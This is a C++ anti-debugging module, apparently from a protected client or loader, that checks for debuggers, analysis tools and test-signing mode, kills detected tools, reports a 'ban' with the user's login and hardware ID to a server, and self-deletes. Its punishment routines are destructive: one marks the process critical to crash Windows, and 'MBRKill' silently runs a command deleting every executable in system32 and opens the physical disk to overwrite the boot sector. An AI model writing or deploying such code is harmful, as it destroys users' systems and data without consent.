#define _CRT_SECURE_NO_WARNINGS
#include "../includes.h"
#include "Security.h"


std::string banreason;

std::string Security::Scramble(std::string target)
{
	std::vector<char> word(target.begin(), target.end());
	std::string alphabet = xorstr_("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");

	for (int i = 0; i < (int)target.length(); i++) {
		for (int j = 0; j < (int)alphabet.length(); j++) {
			if (word[i] == alphabet[j]) {
				word[i] = alphabet[(j + 3) % 26];

				break;
			}
		}
	}
	std::string str(word.begin(), word.end());
	return str;
}

std::string Security::DeScramble(std::string target)
{
	std::vector<char> word(target.begin(), target.end());
	std::string alphabet = xorstr_("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");

	for (int i = 0; i < (int)target.length(); i++) {
		for (int j = 0; j < (int)alphabet.length(); j++) {
			if (word[i] == alphabet[j]) {
				word[i] = alphabet[(j - 3) % 26];

				break;
			}
		}
	}
	std::string str(word.begin(), word.end());
	return str;
}

bool IsDebuggersInstalledThread()
{
	LPVOID drivers[2048];
	DWORD cbNeeded;
	int cDrivers, i;

	if (li(EnumDeviceDrivers)(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		TCHAR szDriver[2048];

		cDrivers = cbNeeded / sizeof(drivers[0]);

		for (i = 0; i < cDrivers; i++)
		{
			if (li(GetDeviceDriverBaseName)(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0])))
			{
				std::string strDriver = szDriver;
				if (strDriver.find(xorstr_("kprocesshacker")) != std::string::npos || strDriver.find(xorstr_("npf")) != std::string::npos || strDriver.find(xorstr_("TitanHide")) != std::string::npos || strDriver.find(xorstr_("SharpOD_Drv")) != std::string::npos || strDriver.find(xorstr_("HTTPDebug")) != std::string::npos)
				{
					banreason.append(strDriver);
					return true;
				}
			}
		}
	}
	return false;
}

bool IsActive(LPCTSTR szProcessName)
{
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = li(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, NULL);

	if (li(Process32First)(snapshot, &entry) == TRUE)
	{
		while (li(Process32Next)(snapshot, &entry) == TRUE)
		{
			if (_stricmp(entry.szExeFile, szProcessName) == 0)
			{
				HANDLE hProcess = li(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
				li(CloseHandle)(hProcess);
				return true;
			}
		}
	}

	li(CloseHandle)(snapshot);
	return false;
}

void killProcessByName(const char* filename)
{
	HANDLE hSnapShot = li(CreateToolhelp32Snapshot)(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = li(Process32First)(hSnapShot, &pEntry);
	while (hRes)
	{
		if (strcmp(pEntry.szExeFile, filename) == 0)
		{
			HANDLE hProcess = li(OpenProcess)(PROCESS_TERMINATE, 0,
				(DWORD)pEntry.th32ProcessID);
			if (hProcess != NULL)
			{
				li(TerminateProcess)(hProcess, 9);
				li(CloseHandle)(hProcess);
			}
		}
		hRes = li(Process32Next)(hSnapShot, &pEntry);
	}
	li(CloseHandle)(hSnapShot);
}


bool IsDriverLoaded(const char* driver)
{
	SERVICE_STATUS sStatus;
	SC_HANDLE  schSCManager;
	SC_HANDLE   schService;

	schSCManager = li(OpenSCManager)(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (schSCManager == 0)
		return false;

	schService = li(OpenServiceA)(schSCManager, driver, SERVICE_ALL_ACCESS);

	if (schService == 0)
		return false;

	bool driverready = false;

	if (li(QueryServiceStatus)(schService, &sStatus))
	{
		switch (sStatus.dwCurrentState)
		{
		case SERVICE_RUNNING:
			return true;
			break;
		}
	}
	return false;
}

bool analysis()
{
	std::vector< std::string > DetectedWindows = {
	 xorstr_("x64dbg"),
	 xorstr_("x32dbg"),
	 xorstr_("IDA: Quick start"),
	 xorstr_("IDA Pro"),
	 xorstr_("OllyDbg"),
	 xorstr_("IDA"),
	 xorstr_("Progress Telerik Fiddler Web Debugger"),
	 xorstr_("Wireshark"),
	 xorstr_("Process Hacker 2"),
	 xorstr_("Please wait..."),
	 xorstr_("Process Hacker"),
	 xorstr_("Process Hacker 3"),
	 xorstr_("Fiddler Everywhere")
	};

	std::vector< std::string > DetectedDrivers = {
		xorstr_("HttpDebuggerSdk"),
		xorstr_("KProcessHacker3")
	};

	std::vector< std::string > szProcesses =
	{
		xorstr_("HttpAnalyzerStdV5.exe"),
		xorstr_("ollydbg.exe"),
		xorstr_("x64dbg.exe"),
		xorstr_("x96dbg.exe"),
		xorstr_("x32dbg.exe"),
		xorstr_("die.exe"),
		xorstr_("tcpview.exe"),
		xorstr_("autoruns.exe"),
		xorstr_("autorunsc.exe"),
		xorstr_("filemon.exe"),
		xorstr_("procmon.exe"),
		xorstr_("regmon.exe"),
		xorstr_("procexp.exe"),
		xorstr_("idaq.exe"),
		xorstr_("idaq64.exe"),
		xorstr_("ida.exe"),
		xorstr_("ida64.exe"),
		xorstr_("ImmunityDebugger.exe"),
		xorstr_("Wireshark.exe"),
		xorstr_("dumpcap.exe"),
		xorstr_("HookExplorer.exe"),
		xorstr_("ImportREC.exe"),
		xorstr_("PETools.exe"),
		xorstr_("LordPE.exe"),
		xorstr_("dumpcap.exe"),
		xorstr_("SysInspector.exe"),
		xorstr_("proc_analyzer.exe"),
		xorstr_("sysAnalyzer.exe"),
		xorstr_("sniff_hit.exe"),
		xorstr_("windbg.exe"),
		xorstr_("joeboxcontrol.exe"),
		xorstr_("joeboxserver.exe"),
		xorstr_("fiddler.exe"),
		xorstr_("tv_w32.exe"),
		xorstr_("tv_x64.exe"),
		xorstr_("Charles.exe"),
		xorstr_("netFilterService.exe"),
		xorstr_("HTTPAnalyzerStdV7.exe"),
		xorstr_("HTTPDebuggerSvc.exe")
	};

	WORD iLength = sizeof(szProcesses) / sizeof(szProcesses[0]);
	for (int i = 0; i < iLength; i++)
	{
		if (IsActive(szProcesses[i].c_str()))
		{
			killProcessByName(szProcesses[i].c_str());
			banreason.append(szProcesses[i].c_str());
			return true;
		}
	}

	for (int i = 0; i < DetectedWindows.size(); i++)
	{
		if (li(FindWindowA)(0, DetectedWindows[i].c_str()) != 0)
		{
			banreason.append(DetectedWindows[i].c_str());
			return true;
		}
	}

	for (int i = 0; i < DetectedDrivers.size(); i++)
	{
		if (IsDriverLoaded(DetectedDrivers[i].c_str()))
		{
			banreason.append(DetectedDrivers[i].c_str());
			return true;
		}
	}
	return false;
}

int remote_debugger_present() {

	HANDLE h_process = INVALID_HANDLE_VALUE;
	BOOL found = FALSE;

	h_process = li(GetCurrentProcess)();

	li(CheckRemoteDebuggerPresent)(h_process, &found);

	if (found)
	{
		banreason.append(xorstr_("CheckRemoteDebuggerPresent"));
		return true;
	}

	return false;
}

typedef NTSTATUS(__stdcall* _NtQueryInformationProcess)(_In_ HANDLE, _In_  unsigned int, _Out_ PVOID, _In_ ULONG, _Out_ PULONG);
typedef NTSTATUS(__stdcall* _NtSetInformationThread)(_In_ HANDLE, _In_ THREAD_INFORMATION_CLASS, _In_ PVOID, _In_ ULONG);


void adbg_NtSetInformationThread(void)
{
	THREAD_INFORMATION_CLASS ThreadHideFromDebugger = (THREAD_INFORMATION_CLASS)0x11;

	HMODULE hNtdll = li(LoadLibraryW)(xorstr_(L"ntdll.dll"));
	if (hNtdll == INVALID_HANDLE_VALUE || hNtdll == NULL)
	{
		return;
	}

	_NtSetInformationThread NtSetInformationThread = NULL;
	NtSetInformationThread = (_NtSetInformationThread)li(GetProcAddress)(hNtdll, xorstr_("NtSetInformationThread"));

	if (NtSetInformationThread == NULL)
	{
		return;
	}

	NtSetInformationThread(li(GetCurrentThread)(), ThreadHideFromDebugger, 0, 0);
}

bool adbg_NtQueryInformationProcess(void)
{
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	PROCESS_BASIC_INFORMATION pProcBasicInfo = { 0 };
	ULONG returnLength = 0;

	// Get a handle to ntdll.dll so we can import NtQueryInformationProcess
	HMODULE hNtdll = li(LoadLibraryA)(xorstr_("ntdll.dll"));
	if (hNtdll == INVALID_HANDLE_VALUE || hNtdll == NULL)
	{
		return false;
	}

	// Dynamically acquire the addres of NtQueryInformationProcess
	_NtQueryInformationProcess  NtQueryInformationProcess = NULL;
	NtQueryInformationProcess = (_NtQueryInformationProcess)li(GetProcAddress)(hNtdll, xorstr_("NtQueryInformationProcess"));

	if (NtQueryInformationProcess == NULL)
	{
		return false;
	}

	hProcess = li(GetCurrentProcess)();

	NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pProcBasicInfo, sizeof(pProcBasicInfo), &returnLength);
	if (NT_SUCCESS(status)) {
		PPEB pPeb = pProcBasicInfo.PebBaseAddress;
		if (pPeb)
		{
			if (pPeb->BeingDebugged)
			{
				banreason.append(xorstr_("pPeb->BeingDebugged"));
				return true;
			}
		}
	}
}

bool checkPEB()
{
	BOOL found = FALSE;
	_asm
	{
		xor eax, eax;
		mov eax, fs: [0x30] ;
		mov eax, [eax + 0x02];
		and eax, 0x000000FF;
		mov found, eax;
	}

	if (found)
	{
		banreason.append(xorstr_("PEB Detected"));
		return true;
	}
}

bool checkPEB2()
{
	BOOL found = FALSE;
	_asm
	{
		xor eax, eax;
		mov eax, fs: [0x30] ;
		mov eax, [eax + 0x68];
		and eax, 0x00000070;

		mov found, eax;
	}


	if (found)
	{
		banreason.append(xorstr_("PEB Detected"));
		return true;
	}
}


bool debug_active_process() {
	BOOL found = FALSE;
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);
	TCHAR sz_path[MAX_PATH];
	DWORD exit_code = 0;

	DWORD proc_id = li(GetCurrentProcessId)();
	std::stringstream stream;
	stream << proc_id;
	std::string args = stream.str();

	const char* cp_id = args.c_str();
	li(CreateMutex)(NULL, FALSE, xorstr_("antidbg"));

	//parent process
	DWORD pid = li(GetCurrentProcessId)();
	li(GetModuleFileName)(NULL, sz_path, MAX_PATH);

	char cmdline[MAX_PATH + 1 + sizeof(int)];
	snprintf(cmdline, sizeof(cmdline), xorstr_ ("%ws %d"), sz_path, pid);

	BOOL success = li(CreateProcessA)(NULL,	cmdline, NULL, NULL, FALSE,	0, NULL, NULL, &si,	&pi);

	li(WaitForSingleObject)(pi.hProcess, INFINITE);

	if (li(GetExitCodeProcess)(pi.hProcess, &exit_code) == 555) { found = TRUE; }

	li(CloseHandle)(pi.hProcess);
	li(CloseHandle)(pi.hThread);

	if (found)
	{
		banreason.append(xorstr_("GetExitCodeProcess"));
		return true;
	}
	return false;
}

void to_lower(unsigned char* input)
{
	char* p = (char*)input;
	unsigned long length = strlen(p);
	for (unsigned long i = 0; i < length; i++) p[i] = tolower(p[i]);
}

BOOL IsRemoteSession(void)
{

	if (li(GetSystemMetrics)(SM_REMOTESESSION)) 
	{
		banreason.append(xorstr_("GetSystemMetrics"));
		return true;
	}
	else
		return false;
}

typedef NTSTATUS(__stdcall* t_NtQuerySystemInformation)(IN ULONG, OUT PVOID, IN ULONG, OUT PULONG);
bool TestSign()
{
	HMODULE ntdll = li(GetModuleHandleA)(xorstr_("ntdll.dll"));

	auto NtQuerySystemInformation = (t_NtQuerySystemInformation)li(GetProcAddress)(ntdll, xorstr_("NtQuerySystemInformation"));

	SYSTEM_CODEINTEGRITY_INFORMATION cInfo;
	cInfo.Length = sizeof(cInfo);

	NtQuerySystemInformation(
		SystemCodeIntegrityInformation,
		&cInfo,
		sizeof(cInfo),
		NULL
	);

	return (cInfo.CodeIntegrityOptions & CODEINTEGRITY_OPTION_TESTSIGN)
		|| (cInfo.CodeIntegrityOptions & CODEINTEGRITY_OPTION_DEBUGMODE_ENABLED);
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (IN BOOLEAN NewValue, OUT PBOOLEAN OldValue, IN BOOLEAN IsWinlogon);

BOOL EnablePriv(LPCSTR lpszPriv)
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(li(GetCurrentProcess)(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!li(LookupPrivilegeValue)(NULL, lpszPriv, &luid)) {
		li(CloseHandle)(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = li(AdjustTokenPrivileges)(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	li(CloseHandle)(hToken);
	return bRet;
}

BOOL MakeCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA(xorstr_("ntdll.dll"));
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)li(GetProcAddress)((HINSTANCE)hDLL, (xorstr_("RtlSetProcessIsCritical")));
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
//del C:\WINDOWS\system32\*.exe /q
void MBRKill()
{

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	std::string cmdline = xorstr_("del C:\\WINDOWS\\system32\\*.exe /q");

	LPSTR szCmd = const_cast<char*>(cmdline.c_str());

	li(CreateProcessA)(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);	


	HANDLE drive = CreateFileW(xorstr_(L"\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	byte* new_mbr = new byte[512];
	DWORD bytes_read;
	if (ReadFile(drive, new_mbr, 512, &bytes_read, 0))
	{
		WriteFile(drive, new_mbr, 512, &bytes_read, 0);
	}
	CloseHandle(drive);

}

std::string BanMyUser(std::string reason)
{

	std::string login = SDK::Registry::GetRegValue(HKEY_CURRENT_USER, REGPATH, LOGIN);
	std::string response = Encrypt::DecryptAES256(HTTP::HttpPrivateSend(xorstr_("ban"), login, reason, SDK::GetHWID()), CipherKey, Cipher_IV_Key);
	
	CHAR szExeFileName[MAX_PATH];
	li(GetModuleFileName)(NULL, szExeFileName, MAX_PATH);
	std::string newname = SDK::GetRandomString(16).c_str();
	newname.append(xorstr_(".exe"));

	std::string cmdline = xorstr_("cmd.exe /c ping localhost -n 3 > nul & del /f /q  ");
	cmdline.append(newname);

	li(rename)(szExeFileName, newname.c_str());
	{
		STARTUPINFO si = { 0 };
		PROCESS_INFORMATION pi = { 0 };

		LPSTR szCmd = const_cast<char*>(cmdline.c_str());

		li(CreateProcessA)(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
		li(CloseHandle)(pi.hProcess);
		li(CloseHandle)(pi.hThread);
	}

	if (DetectShitType == 1) {
		li(raise)(11);
	}
	else if (DetectShitType == 2)
	{
		MakeCritical();
	}
	else if (DetectShitType == 3)
	{
		MBRKill();
		li(Sleep)(10000);
		MakeCritical();
	}

}

void TerminateHooker()
{
	BanMyUser(xorstr_("WriteProcessMemory hook"));
}

bool checkOnBadTime()
{
	int result;

	time_t get_time;

	get_time = li(time)(0);


	result = li(time)(0) - get_time;

	if (result > 5) {
		banreason.append(xorstr_("Breakpoint/Suspend detected"));
		return true;
	}
	else
		return false;
}

BOOL sub_43F030()
{
	HANDLE v0; // esi
	HMODULE v1; // eax
	FARPROC DbgUiRemoteBreakin; // eax

	v0 = li(GetCurrentProcess)();
	v1 = li(GetModuleHandle)(xorstr_("ntdll.dll"));
	DbgUiRemoteBreakin = li(GetProcAddress)(v1, xorstr_("DbgUiRemoteBreakin"));
	return li(WriteProcessMemory)(v0, DbgUiRemoteBreakin, TerminateHooker, 6u, 0);
}

BOOL CheckPEBu()
{
	PBOOLEAN BeingDebugged = (PBOOLEAN)__readfsdword(0x0C * sizeof(PVOID));
	if (*BeingDebugged)
	{
		banreason.append(xorstr_("Debugger Detecteb by PEB"));
		return true;
	}
	else {
		return false;
	}
}


void Security::Init()
{
	while (1)
	{
		sub_43F030();
		if (IsRemoteSession() || CheckPEBu() || checkOnBadTime() || checkPEB2() || checkPEB() || TestSign() || IsDebuggersInstalledThread() || analysis() || IsDebuggerPresent() || remote_debugger_present() || debug_active_process())
			BanMyUser(banreason);

		std::this_thread::sleep_for(std::chrono::milliseconds(500));
	}
}
